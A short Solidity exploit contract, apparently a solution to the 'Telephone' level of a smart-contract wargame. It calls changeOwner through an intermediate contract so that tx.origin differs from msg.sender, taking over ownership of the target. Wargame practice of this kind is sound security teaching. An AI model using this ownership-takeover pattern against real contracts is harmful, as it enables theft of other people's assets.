// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract AttackContract 
{
 Telephone telephoneContract;

 constructor (Telephone _telephoneContract) public 
 {
  telephoneContract = Telephone(_telephoneContract);
 }

 function attack () public
 {
  telephoneContract.changeOwner(msg.sender);
 }
}